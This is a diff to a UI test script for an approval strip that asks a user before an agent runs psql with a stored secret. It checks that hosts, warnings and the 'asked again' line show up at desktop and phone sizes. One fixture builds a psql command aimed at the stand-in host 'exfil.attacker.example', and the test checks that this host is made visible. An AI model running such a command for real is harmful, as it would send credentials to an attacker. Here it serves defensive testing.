@@ -1793,22 +1793,60 @@ try {
     const RUN21 = { id: 'ut-r14run01', sessionKey: KEY21, status: 'open', kind: 'action', origin: 'vault', by: 'agent', urgency: 'urgent', text: 'clear wants to run a command with a stored secret', detail: 'Program: psql', createdAt: Date.now() - 5e3, expiresAt: Date.now() + 55e3,
       action: { type: 'vault-run-ask', askId: 'e'.repeat(32), always: true, tool: 'x' }, facts: FXR };
     await A.evalJs(PUSH21(`[${J(RUN21)}]`)); await A.waitFor(`!!${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="ut-r14run01"]')`, 8000); await sleep(800);
-    const RUNM = `(() => { ${R21} const d = ${CHAT(s21)}.element.querySelector('.chat-attn-dock'), row = d && d.querySelector('.ut-item[data-id="ut-r14run01"]'); if (!row) return null; const vis = (e) => !!e && e.getClientRects().length > 0 && getComputedStyle(e).visibility !== 'hidden';
-      const ans = [...row.querySelectorAll('.ut-run-answer > button')].filter(vis).map((b) => ({ k: b.dataset.answer, ...R(b) })), cmd = row.querySelector('.ut-run-cmd'), dl = row.querySelector('.ut-deadline');
-      return { ans, cmd: vis(cmd) ? { text: cmd.textContent.slice(0, 40), h: Math.round(cmd.getBoundingClientRect().height) } : null, clock: vis(dl) ? dl.textContent : null, over: d.scrollWidth - d.clientWidth, facts: !!row.querySelector('.ut-run-facts') && vis(row.querySelector('.ut-run-facts')), vw: innerWidth }; })()`;
+    // r15: what the answers decide on — the strip's own facts line (.ut-run-gist: its rows, the warning accent, the again / cut
+    // lines, or the line that says they are on the card), each whole: inside the window, never clipped
+    const RUNM_OF = (id) => `(() => { ${R21} const d = ${CHAT(s21)}.element.querySelector('.chat-attn-dock'), row = d && d.querySelector('.ut-item[data-id="${id}"]'); if (!row) return null; const vis = (e) => !!e && e.getClientRects().length > 0 && getComputedStyle(e).visibility !== 'hidden';
+      const ans = [...row.querySelectorAll('.ut-run-answer > button')].filter(vis).map((b) => ({ k: b.dataset.answer, ...R(b) })), cmd = row.querySelector('.ut-run-cmd'), dl = row.querySelector('.ut-deadline'), g = row.querySelector('.ut-run-gist'), w = row.closest('.window');
+      const line = (q) => { const e = g && g.querySelector(q); return vis(e) ? e.textContent : null; };
+      const gist = vis(g) ? { text: g.textContent, out: g.classList.contains('ut-run-gist-out'), again: line('.ut-run-again'), cut: line('.ut-run-cut'), clip: g.scrollWidth - g.clientWidth, ...R(g),
+        rows: [...g.querySelectorAll('.ut-run-grow')].filter(vis).map((e) => ({ k: e.dataset.fact, warn: e.classList.contains('ut-run-warn'), text: e.textContent, color: getComputedStyle(e.querySelector('.ut-run-val')).color, ...R(e) })) } : null;
+      return { ans, cmd: vis(cmd) ? { text: cmd.textContent.slice(0, 40), h: Math.round(cmd.getBoundingClientRect().height) } : null, clock: vis(dl) ? dl.textContent : null, dl: vis(dl) ? { ...R(dl), clip: dl.scrollWidth - dl.clientWidth } : null, over: d.scrollWidth - d.clientWidth, facts: !!row.querySelector('.ut-run-facts') && vis(row.querySelector('.ut-run-facts')), gist, vw: innerWidth, wr: w ? Math.floor(w.getBoundingClientRect().right) : null, textColor: getComputedStyle(row).color }; })()`;
+    const RUNM = RUNM_OF('ut-r14run01');
     const r1 = await A.evalJs(RUNM);
     await A.shot('desktop-1280-dock-run.png');
-    check(`RED-able (r14 — 5b4b36649 hid .ut-run and .ut-deadline: a vault-run ask's strip showed its question and ⤢ only, yet the no-record toast says «answer it in the strip»): the strip draws the run card's command head («${r1 && r1.cmd && r1.cmd.text}», one line), its THREE answers (${J(r1 && r1.ans.map((a) => a.k))}) and its clock («${r1 && r1.clock}») — the facts stay the card's; nothing past the window's edge`,
-      !!r1 && r1.ans.map((a) => a.k).join() === 'once,always,deny' && !!r1.cmd && /psql/.test(r1.cmd.text) && r1.cmd.h <= 20 && /left|sec/.test(r1.clock || '') && !r1.facts && r1.over <= 1, r1);
+    check(`RED-able (r14 — 5b4b36649 hid .ut-run and .ut-deadline: a vault-run ask's strip showed its question and ⤢ only, yet the no-record toast says «answer it in the strip»): the strip draws the run card's command head («${r1 && r1.cmd && r1.cmd.text}», one line), its THREE answers (${J(r1 && r1.ans.map((a) => a.k))}) and its clock («${r1 && r1.clock}») — r15: beside what they decide on («${r1 && r1.gist && r1.gist.text}»), not the card's rows; nothing past the window's edge`,
+      !!r1 && r1.ans.map((a) => a.k).join() === 'once,always,deny' && !!r1.cmd && /psql/.test(r1.cmd.text) && r1.cmd.h <= 20 && /left|sec/.test(r1.clock || '') && !r1.facts && !!r1.gist && /Sends to db\.example\.com/.test(r1.gist.text) && r1.over <= 1, r1);
+    // (c2) r15 (the r14 acceptance — the strip offered «Always let this conversation use it (these hosts)» with the hosts, the
+    // warning row and the «asked again» line hidden): A PRESS POINT NEVER SENDS A SCOPE IT DOES NOT SHOW — each ask in the strip
+    const runV = (id, facts, action = {}, at = {}) => ({ ...RUN21, id, createdAt: Date.now() - 5e3, expiresAt: Date.now() + 55e3, ...at, action: { ...RUN21.action, askId: id.slice(-1).repeat(32), ...action }, facts });
+    const LONG21 = 'psql ' + Array.from({ length: 10 }, (_, k) => `-v col${k}=some_long_value_${k}`).join(' ') + ' -h exfil.attacker.example -U svc -c "select 1"';
+    const V15 = [
+      ['past', runV('ut-r15past1', { ...FXR, cmd: LONG21, hosts: { known: true, list: ['exfil.attacker.example'] } })],
+      ['writable', runV('ut-r15writ2', { ...FXR, tool: { ...FXR.tool, path: '~/workspace/ops/bin/psql', writable: true }, always: { offered: false, why: 'program-writable', directive: null } }, { always: false })],
+      ['again', runV('ut-r15agan3', { ...FXR, whyAgain: { code: 'args' } })],
+      ['many', runV('ut-r15many4', { ...FXR, hosts: { known: true, list: Array.from({ length: 12 }, (_, k) => `replica-${k}.db.internal.example`) } })],
+    ];
+    const v15 = {};
+    for (const [k, it] of V15) {
+      await A.evalJs(PUSH21(`[${J(it)}]`)); await A.waitFor(`!!${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="${it.id}"]')`, 8000); await sleep(700);
+      await A.evalJs(noToasts);
+      v15[k] = await A.evalJs(RUNM_OF(it.id));
+      await A.shot(`desktop-1280-dock-run-${k}.png`);
+    }
+    const ks = (v) => (v ? v.ans.map((a) => a.k).join() : null), whole = (v) => !!v && !!v.gist && v.gist.clip <= 1 && v.gist.r <= v.wr && v.gist.rows.every((r) => r.r <= v.wr) && v.over <= 1;
+    const hostRow = (v, h) => !!v && !!v.gist && v.gist.rows.some((r) => r.k === 'hosts' && r.text.includes(h));
+    const pv = v15.past, wv = v15.writable, av = v15.again, mv = v15.many;
+    check(`RED-able (r15 — 2353267f1: «Always … (these hosts)» in the strip, the host only past the command's ellipsis): a run ask whose host lies past the ellipsis («${pv && pv.cmd && pv.cmd.text}…») ⇒ the strip SAYS its hosts row («${pv && pv.gist && pv.gist.rows.map((r) => r.text).join(' | ')}», whole, inside the window) before its ${J(ks(pv))} — or offers no Always`,
+      (hostRow(pv, 'exfil.attacker.example') && whole(pv) && ks(pv) === 'once,always,deny') || (!!pv && !pv.ans.some((a) => a.k === 'always')), pv);
+    const wr = wv && wv.gist && wv.gist.rows.find((r) => r.k === 'program'), hr = wv && wv.gist && wv.gist.rows.find((r) => r.k === 'hosts');
+    check(`RED-able (r15 — 2353267f1 hid the warning row): a program an agent can write ⇒ its warning row in the strip («${wr && wr.text}», the warning accent ${wr && wr.color} — the hosts row's ${hr && hr.color}) beside ${J(ks(wv))}`,
+      !!wr && wr.warn && /in a folder an agent can write/.test(wr.text) && !!hr && wr.color !== hr.color && whole(wv) && ks(wv) === 'once,deny', wv);
+    check(`RED-able (r15 — 2353267f1 hid the «asked again» line): a near-identical rerun ⇒ the strip says how it differs («${av && av.gist && av.gist.again}») before its ${J(ks(av))}`,
+      !!av && !!av.gist && /Asked again — it differs from the command you let through: its arguments changed/.test(av.gist.again || '') && whole(av) && ks(av) === 'once,always,deny', av);
+    check(`r15: facts too long for a strip (twelve hosts) ⇒ none of them, the line that says where they are («${mv && mv.gist && mv.gist.text}») and only ${J(ks(mv))} — «Always» is the card's`,
+      !!mv && !!mv.gist && mv.gist.out && /what it decides on, and «Always», are on its card/.test(mv.gist.text) && !/replica-0/.test(mv.gist.text) && ks(mv) === 'once,deny' && whole(mv), mv);
     // (d) MINOR D (1): a FORM the system opened — BEHIND the maximized chat, under the stack ⇒ the card shows; in front ⇒ aside
     const F21 = `(() => { const w = [...app.wm.windows.values()].find((x) => x.type === 'form' && !x.isMinimized); return w || null; })()`;
     await A.evalJs(`(() => { window.__sh21 = app.pluginClient._hostApi({ id: 'r14probe', version: '1' }, new AbortController()).createModalShell({ id: 'r14form', title: 'A form the system opened', kind: 'form', opener: 'system', escapeToClose: true }); window.__sh21.body.innerHTML = '<label>Name <input class="r14-in"></label>'; return 1; })()`);
     await A.waitFor(`!!${F21}`, 6000); await sleep(600);
     await A.evalJs(PUSH21(`[${J(ex21('ut-r14form1', 'echo behind'))}]`)); await A.waitFor(`!!document.querySelector('.ut-announce .uta-card[data-id="ut-r14form1"]')`, 8000); await sleep(300);
+    // (r15: the stack settles first — it follows the strip, and a strip that just changed height moves it at the next pass;
+    // a form placed by where the stack WAS leaves the card's middle uncovered)
+    for (let k = 0, last = null; k < 10; k++) { const top = await A.evalJs(`Math.round(document.querySelector('.ut-announce').getBoundingClientRect().top)`); if (top === last) break; last = top; await sleep(1100); }
     await A.evalJs(`(() => { const f = ${F21}, s = document.querySelector('.ut-announce').getBoundingClientRect(), ws = app.wm.workspace.getBoundingClientRect(); f.element.style.left = Math.max(0, s.left - ws.left - 40) + 'px'; f.element.style.top = Math.max(0, s.top - ws.top - 40) + 'px'; return 1; })()`); await sleep(1300);
     await A.evalJs(noToasts);
     const SEEN = `(() => { const s = document.querySelector('.ut-announce'), c = s && s.querySelector('.uta-card[data-id="ut-r14form1"]'), f = ${F21}; if (!c || !f) return null; const r = c.getBoundingClientRect(), fr = f.element.getBoundingClientRect(), x = r.left + r.width / 2, y = r.top + r.height / 2;
-      const under = document.elementsFromPoint(x, y).find((e) => !s.contains(e)); return { aside: getComputedStyle(s).visibility === 'hidden', formUnder: fr.left < r.right && fr.right > r.left && fr.top < r.bottom && fr.bottom > r.top, front: under ? (under.closest('.window') === f.element ? 'form' : under.closest('.window') ? 'chat' : (under.id || under.className || under.tagName).toString().slice(0, 30)) : null }; })()`;
+      const under = document.elementsFromPoint(x, y).find((e) => !s.contains(e)); return { card: [Math.round(r.left), Math.round(r.top), Math.round(r.right), Math.round(r.bottom)], form: [Math.round(fr.left), Math.round(fr.top), Math.round(fr.right), Math.round(fr.bottom)], aside: getComputedStyle(s).visibility === 'hidden', formUnder: fr.left < r.right && fr.right > r.left && fr.top < r.bottom && fr.bottom > r.top, front: under ? (under.closest('.window') === f.element ? 'form' : under.closest('.window') ? 'chat' : (under.id || under.className || under.tagName).toString().slice(0, 30)) : null }; })()`;
     const d1 = await A.evalJs(SEEN);
     await A.shot('desktop-1280-announce-form-behind.png');
     await A.evalJs(`(() => { const f = ${F21}; app.wm.focusWindow?.(f.id); return 1; })()`); await sleep(1300);
@@ -1822,6 +1860,23 @@ try {
     await A.evalJs(`(() => { const o = document.getElementById('dialog-overlay'); (o.querySelector('.dialog-close, [data-close], .btn-cancel') || {}).click?.(); if (!o.classList.contains('hidden')) document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); return 1; })()`); await sleep(400);
     check(`RED-able (r14 — 5b4b36649 asked at its 1 s tick only: up to a second over the act just opened): a dialog opened while a card stands ⇒ the stack steps aside AT the open (${e1 && (e1.aside ? 'aside' : 'still shown')} ${e1 && e1.ms} ms after, two frames)`, !!e1 && e1.open && e1.aside, e1);
     await A.evalJs(`(() => { const w = ${CHAT(s21)}; if (w.isMaximized) app.wm.toggleMaximize(w.id); return 1; })()`);
+    // (c3) r15 MINOR 2 (the r14 acceptance: a LATE run's line, one line and no ellipsis, ran past a 700 px window's edge): a chat
+    // window 700 px wide, a late run and a late run after a restart — the clock's line wraps inside the window, every word of it
+    await A.evalJs(`(() => { const w = ${CHAT(s21)}; if (w.isMaximized) app.wm.toggleMaximize(w.id); app.wm.focusWindow?.(w.id); app.wm.resizeWindowTo(w.id, { w: 700, h: 640 }); return 1; })()`); await sleep(900);
+    const lateAt = { createdAt: Date.now() - 95e3, expiresAt: Date.now() - 35e3 };
+    const L15 = [['late', runV('ut-r15late5', { ...FXR }, { late: true }, lateAt), /goes through \(once\)$/], ['lost', runV('ut-r15lost6', { ...FXR }, { late: true, restartLost: true }, lateAt), /its next run asks again$/]];
+    const l15 = {};
+    for (const [k, it, end] of L15) {
+      await A.evalJs(PUSH21(`[${J(it)}]`)); await A.waitFor(`!!${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="${it.id}"] .ut-deadline')`, 8000); await sleep(700);
+      await A.evalJs(noToasts);
+      const m = await A.evalJs(RUNM_OF(it.id));
+      const onStrip = await A.evalJs(`(() => { const s = document.querySelector('.ut-announce'), d = ${CHAT(s21)}.element.querySelector('.chat-attn-dock'); if (!s || !d || getComputedStyle(s).visibility === 'hidden') return false; const a = s.getBoundingClientRect(), b = d.getBoundingClientRect(); return a.left < b.right && a.right > b.left && a.top < b.bottom && a.bottom > b.top; })()`); // r15: the strip grew under the stack — it follows at once
+      l15[k] = m && { ...m, onStrip, ends: end.test((m.clock || '').trim()), win: await A.evalJs(`Math.round(${CHAT(s21)}.element.getBoundingClientRect().width)`) };
+      if (k === 'late') await A.shot('desktop-700-dock-late.png');
+    }
+    const inWin = (v) => !!v && !!v.dl && v.dl.r <= v.wr && v.dl.clip <= 1 && v.over <= 1 && v.ends && !v.onStrip; // (r15: and no announce card on the strip that grew — 700 ms after, never the next tick)
+    check(`RED-able (r15 — 2353267f1: «flex: none; white-space: nowrap» — the late line cut at the window's edge): a chat window ${l15.late && l15.late.win} px wide — a late run's clock line («${l15.late && l15.late.clock}», ${l15.late && l15.late.dl && (l15.late.dl.b - l15.late.dl.t)} px tall) and a late run's after a restart (${l15.lost && l15.lost.dl && (l15.lost.dl.b - l15.lost.dl.t)} px tall) wrap inside it, every word (right edges ${l15.late && l15.late.dl && l15.late.dl.r} / ${l15.lost && l15.lost.dl && l15.lost.dl.r} ≤ the window's ${l15.late && l15.late.wr})`,
+      inWin(l15.late) && inWin(l15.lost) && l15.late.win <= 702, l15);
     await A.evalJs(PUSH21('d.todos.open')); await sleep(600);
     // (f) THE PHONE (375 × 812, touch): a card arriving while the phone's For-you page shows steps aside; the stack's layer is under the tray's
     await A.device(375, 812); await A.load();
@@ -1870,14 +1925,23 @@ try {
     const r2 = await A.evalJs(RUNM);
     const top2 = await A.evalJs(`(() => { const row = ${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="ut-r14run01"]'); return row ? [...row.querySelectorAll('.ut-run-answer > button')].map((b) => { const q = b.getBoundingClientRect(), h = document.elementFromPoint(q.left + q.width / 2, q.top + q.height / 2); return h === b || b.contains(h) ? 'own' : h ? (h.closest('#global-toasts') ? 'toast' : h.closest('.ut-announce') ? 'announce' : (h.className || h.tagName).toString().slice(0, 30)) : 'none'; }) : []; })()`); // (the arrival toasts STAND: on this tier they rise above the composer — r14: and above the strip)
     await A.shot('phone-375-dock-run.png');
-    check(`r14 the run ask's strip at 375 (touch): the command head on one line («${r2 && r2.cmd && r2.cmd.text}»), the three answers (${J(r2 && r2.ans.map((a) => a.k + ' ' + (a.b - a.t) + 'px'))}) each ≥ 44 px, inside the window and the topmost thing where a tap lands — the arrival toasts standing (${J(top2)}; the phone's toasts stood over the strip's answers before r14), the clock («${r2 && r2.clock}»)`,
-      !!r2 && r2.ans.map((a) => a.k).join() === 'once,always,deny' && r2.ans.every((a) => a.b - a.t >= 44 && a.l >= 0 && a.r <= r2.vw) && top2.length === 3 && top2.every((x) => x === 'own') && !!r2.cmd && r2.cmd.h <= 24 && !!r2.clock && r2.over <= 1, { r2, top2 });
+    check(`r14 the run ask's strip at 375 (touch): the command head on one line («${r2 && r2.cmd && r2.cmd.text}»), the three answers (${J(r2 && r2.ans.map((a) => a.k + ' ' + (a.b - a.t) + 'px'))}) each ≥ 44 px, inside the window and the topmost thing where a tap lands — the arrival toasts standing (${J(top2)}; the phone's toasts stood over the strip's answers before r14), the clock («${r2 && r2.clock}»); r15: what they decide on («${r2 && r2.gist && r2.gist.text}», inside the screen)`,
+      !!r2 && r2.ans.map((a) => a.k).join() === 'once,always,deny' && r2.ans.every((a) => a.b - a.t >= 44 && a.l >= 0 && a.r <= r2.vw) && top2.length === 3 && top2.every((x) => x === 'own') && !!r2.cmd && r2.cmd.h <= 24 && !!r2.clock && r2.over <= 1 && !!r2.gist && /Sends to db\.example\.com/.test(r2.gist.text) && r2.gist.r <= r2.vw && r2.gist.clip <= 1, { r2, top2 });
+    // …and a program an agent can write, at 375: its warning row whole on the phone, Allow once / Deny
+    const W375 = runV('ut-r15writ7', { ...FXR, tool: { ...FXR.tool, path: '~/workspace/ops/bin/psql', writable: true }, always: { offered: false, why: 'program-writable', directive: null } }, { always: false });
+    await A.evalJs(PUSH21(`[${J(W375)}]`)); await A.waitFor(`!!${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="ut-r15writ7"]')`, 8000); await sleep(800);
+    await A.evalJs(noToasts);
+    const w2 = await A.evalJs(RUNM_OF('ut-r15writ7'));
+    await A.shot('phone-375-dock-run-writable.png');
+    const w2r = w2 && w2.gist && w2.gist.rows.find((r) => r.k === 'program');
+    check(`r15 at 375 (touch): a program an agent can write — its warning row («${w2r && w2r.text}») whole inside the screen (right ${w2r && w2r.r} ≤ ${w2 && w2.vw}), beside ${J(w2 && w2.ans.map((a) => a.k))}`,
+      !!w2r && w2r.warn && /in a folder an agent can write/.test(w2r.text) && w2r.r <= w2.vw && w2.gist.clip <= 1 && w2.ans.map((a) => a.k).join() === 'once,deny' && w2.over <= 1, w2);
     await A.evalJs(PUSH21('d.todos.open')); await sleep(400);
     await A.device(1280, 800, { mouse: true }); await A.load(); await sleep(600);
   } catch (e) { fail++; console.log('  ✗ ㉑ threw: ' + (e?.message || e)); }
   lap('㉑ done');
 
-  check('the shots are written (desktop 1280 + phone 375)', ['desktop-1280-watch-request.png', 'desktop-1280-ask-chips.png', 'desktop-1280-resolved.png', 'phone-375-watch-request.png', 'phone-375-ask-chips.png', 'phone-375-resolved.png', 'phone-375-accordion.png', 'phone-375-accordion-opened.png', 'desktop-1280-accordion.png', 'desktop-1280-tail.png', 'phone-390-tail.png', 'desktop-1280-dock-one.png', 'desktop-1280-dock-three.png', 'desktop-1280-dock-twenty.png', 'desktop-1280-dock-400-chars.png', 'desktop-1280-dock-six-options.png', 'desktop-320-dock.png', 'desktop-1280-dock-composer-6-lines.png', 'desktop-1280-dock-5000-up.png', 'phone-390-dock-two.png', 'phone-390-dock-twenty.png', 'phone-390-dock-six-options.png', 'desktop-1280-announce-one.png', 'desktop-1280-announce-ten.png', 'desktop-1280-announce-expired.png', 'desktop-1280-announce-two-windows.png', 'phone-390-announce.png', 'desktop-1280-reach-card.png', 'desktop-1280-dock-reach.png', 'desktop-1280-dock-reach-instance.png', 'phone-390-dock-reach.png', 'desktop-380-dock-reach.png', 'desktop-1280-announce-yields-tray.png', 'desktop-1280-announce-under-dialog.png', 'desktop-1280-announce-clear-composer.png', 'desktop-1280-dock-run.png', 'desktop-1280-announce-form-behind.png', 'phone-375-announce-over-home.png', 'phone-375-announce-under-tray.png', 'phone-375-dock-run.png'].every((f) => fs.existsSync(path.join(SHOTS, f)))); // (+ lane needs-card-tail r10: the strip's and the announce's shots — the UI verdict is visual)
+  check('the shots are written (desktop 1280 + phone 375)', ['desktop-1280-watch-request.png', 'desktop-1280-ask-chips.png', 'desktop-1280-resolved.png', 'phone-375-watch-request.png', 'phone-375-ask-chips.png', 'phone-375-resolved.png', 'phone-375-accordion.png', 'phone-375-accordion-opened.png', 'desktop-1280-accordion.png', 'desktop-1280-tail.png', 'phone-390-tail.png', 'desktop-1280-dock-one.png', 'desktop-1280-dock-three.png', 'desktop-1280-dock-twenty.png', 'desktop-1280-dock-400-chars.png', 'desktop-1280-dock-six-options.png', 'desktop-320-dock.png', 'desktop-1280-dock-composer-6-lines.png', 'desktop-1280-dock-5000-up.png', 'phone-390-dock-two.png', 'phone-390-dock-twenty.png', 'phone-390-dock-six-options.png', 'desktop-1280-announce-one.png', 'desktop-1280-announce-ten.png', 'desktop-1280-announce-expired.png', 'desktop-1280-announce-two-windows.png', 'phone-390-announce.png', 'desktop-1280-reach-card.png', 'desktop-1280-dock-reach.png', 'desktop-1280-dock-reach-instance.png', 'phone-390-dock-reach.png', 'desktop-380-dock-reach.png', 'desktop-1280-announce-yields-tray.png', 'desktop-1280-announce-under-dialog.png', 'desktop-1280-announce-clear-composer.png', 'desktop-1280-dock-run.png', 'desktop-1280-announce-form-behind.png', 'phone-375-announce-over-home.png', 'phone-375-announce-under-tray.png', 'phone-375-dock-run.png', 'desktop-1280-dock-run-past.png', 'desktop-1280-dock-run-writable.png', 'desktop-1280-dock-run-again.png', 'desktop-1280-dock-run-many.png', 'desktop-700-dock-late.png', 'phone-375-dock-run-writable.png'].every((f) => fs.existsSync(path.join(SHOTS, f)))); // (+ lane needs-card-tail r10: the strip's and the announce's shots — the UI verdict is visual)
   check('no page error', pageErrors.length === 0, pageErrors.slice(0, 5));
 } catch (e) { fail++; console.log('  ✗ threw: ' + (e?.stack || e)); }
 
